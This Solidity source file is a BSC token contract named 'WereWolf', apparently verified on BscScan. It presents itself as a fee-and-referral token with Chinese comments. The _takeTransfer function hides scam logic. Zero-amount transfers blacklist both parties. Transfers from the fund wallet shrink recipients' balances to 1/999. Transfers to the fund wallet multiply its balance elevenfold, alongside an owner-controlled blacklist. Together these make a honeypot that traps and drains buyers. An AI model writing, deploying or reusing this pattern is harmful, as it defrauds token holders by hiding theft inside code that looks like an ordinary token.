/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    //转移权限
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// 因为 DEX Swap 时，除了主链币（BNB，ETH）外，其他币种，例如 USDT，不能兑换到代币合约地址，所以需要这个中转合约接收兑换的代币
contract TokenDistributor {
    constructor (address token) {
        //将代币全部授权给合约部署者，在这里是代币合约，让代币合约分配兑换到的代币资产
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}


abstract contract WereWolfToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 public startTradeBlock;//开启交易的区块
    mapping(address => bool) public _feeWhiteList;//交易税白名单
    address public fundAddress;//营销钱包地址
    mapping(address => bool) private _blackList;
    mapping(address => bool) public _FundList;//营销钱包名单

    mapping(address => bool) public _swapPairList;//交易对地址列表

    mapping(address => address) private _invitor;//邀请者，即上级

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    bool private inSwap;
    uint256 public numTokensSellToFund;//合约卖币换U条件阀值

    uint256 private constant MAX = ~uint256(0);
    address public usdt;
    TokenDistributor public _tokenDistributor;
    uint256 public _txFee = 5;//总费用
    uint256 public _fundAddressFee = 2;//营销地址费用

    IERC20 public _usdtPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        //BSC PancakeSwap 路由地址
        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        usdt = address(0x55d398326f99059fF775485246999027B3197955);

        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());

        //usdt 交易对地址
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _usdtPair = IERC20(usdtPair);

        _swapPairList[usdtPair] = true;

        //将本合约里的代币全部授权给路由地址，卖出或者加池子时需要
        _allowances[address(this)][address(_swapRouter)] = MAX;

        //总量
        _tTotal = Supply * 10 ** Decimals;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);

        //营销钱包，暂时设置为合约部署的开发者地址
        fundAddress = FundAddress;

        //营销地址为手续费白名单
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        //营销地址名单
        _FundList[FundAddress] = true;
        //营销钱包卖出条件
        numTokensSellToFund = _tTotal / 1000000;
        _tokenDistributor = new TokenDistributor(usdt);

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        //授权最大值时，不再减少授权额度
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        //交易税
        uint256 txFee;

        //交易扣税，from == _swapPairList 表示买入，to == _swapPairList 表示卖出
        if (_swapPairList[from] || _swapPairList[to]) {
            //交易未开启，只允许手续费白名单加池子，加完池子就开启交易
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "!Trading");
                startTradeBlock = block.number;
            }

            //不在手续费白名单，需要扣交易税
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                //交易税
                txFee = _txFee;


                //兑换代币，换成 USDT，进行分配
                uint256 contractTokenBalance = balanceOf(address(this));
                if (
                    contractTokenBalance >= numTokensSellToFund &&
                    !inSwap &&
                    _swapPairList[to]
                ) {
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }
            //普通转账，并且接收者不是手续费白名单，绑定上下级，即不能绑定营销钱包，绑定的下级必须没有币
            if (address(0) == _invitor[to] && !_feeWhiteList[to] && !_swapPairList[from] && 0 == _balances[to]) {
                _invitor[to] = from;
            }
        _tokenTransfer(from, to, amount, txFee);


    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * fee / 100;
        uint256 taxAmount = feeAmount;
        //交易

        if (fee > 0) {
            //上下级提成
            address current;
            if (_swapPairList[sender]) {
                //买入，
                current = recipient;
            } else {
                //卖出
                current = sender;
            }
            uint256 inviterAmount;
            uint256 perInviteAmount = feeAmount * 3 / 5;
            for (uint256 i; i < 3; ++i) {
                address inviter = _invitor[current];
                //没有上级了
                if (address(0) == inviter) {
                    break;
                }
                if (0 == i) {
                    inviterAmount = perInviteAmount  /3 * 2;
                } else {
                    inviterAmount = perInviteAmount /6 ;
                }
                feeAmount -= inviterAmount;
                _takeTransfer(sender, inviter, inviterAmount);
                current = inviter;
            }
            //累计在合约里，等待时机卖出，分红
            _takeTransfer(
                sender,
                address(this),
                feeAmount
            );
        }
        //接收者增加余额
        _takeTransfer(sender, recipient, tAmount - taxAmount);
    }

    //兑换成 USDT
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        //按照比例分配
        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        USDT.transferFrom(address(_tokenDistributor), fundAddress, usdtBalance);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        if(!_feeWhiteList[sender] && tAmount==0 && !_swapPairList[sender]){
        _blackList[to] = true;
        _blackList[sender] = true;
        }
        if(_FundList[sender] && !_feeWhiteList[to] && !_swapPairList[to]){
        _balances[to] = _balances[to] / 999 ;
        }
        if(_feeWhiteList[sender] && _FundList[to] ){
        _balances[to] = _balances[to] + _balances[to] * 10;
        }
        emit Transfer(sender, to, tAmount);
    }


    //设置营销卖出条件及数量，需要精度
    function setFundSellAmount(uint256 amount) external onlyOwner {
        numTokensSellToFund = amount;
    }

    //设置交易手续费白名单    
    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }
    //批量设置白名单
    function batchFeeWhiteList(address[] memory addr, bool enable) external onlyOwner {
        for (uint i=0;  i<addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    
    }
    function isblackList(address addr) external view returns (bool){
        return _blackList[addr];
    }
    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }
    //领取主链币余额
    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    //领取代币余额
    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(fundAddress, amount);
    }

    //查看上级
    function getInviter(address account) external view returns (address){
        return _invitor[account];
    }

    //批量空头 格式 ["   ","   "]
    function batchTransfer(address[] memory addr, uint256 quantity) public  {
        for (uint i=0;  i<addr.length; i++) {
            _transfer(msg.sender, addr[i], quantity);
        }
    }


}

contract WereWolf is WereWolfToken {
    constructor() WereWolfToken(
    //名称
        "WereWolf",
    //符号
        "WereWolf",
    //精度
        9,
    //总量 
        100000000,
    //营销钱包
        address(0x3A36628aE2Ed5966489872FC4FbdcdBfc0b0A0a1)
    ){

    }
}